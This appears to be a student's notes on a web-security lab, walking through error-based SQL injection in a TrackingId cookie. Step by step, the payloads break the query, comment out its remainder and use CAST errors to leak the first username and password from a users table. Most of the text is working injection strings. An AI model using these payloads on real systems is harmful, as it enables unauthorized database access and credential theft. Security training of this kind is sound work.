append a single quote to the tracking id
that will cause a verbose error message which discloses the full SQL query including the value of the cookie

TrackingId=ogAZZfxtOKUELbuJ'

add comment characters to comment out the rest of the query which includes the extra quote chr causing the error,you will no longer receive an error

TrackingId=ogAZZfxtOKUELbuJ'--

modify the query to include a SELECT subquery and cast the returned value to an int type

TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--

you get an error saying AND should be a boolean

TrackingId=ogAZZfxtOKUELbuJ' AND 1 =CAST((SELECT 1) AS int)--

the error dissapears

TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--

you get an error suggesting there is a character limit,delete the tracking id to fix this

TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--

modify to retuen only one row

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

this should return the first username from the table

now get the password

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
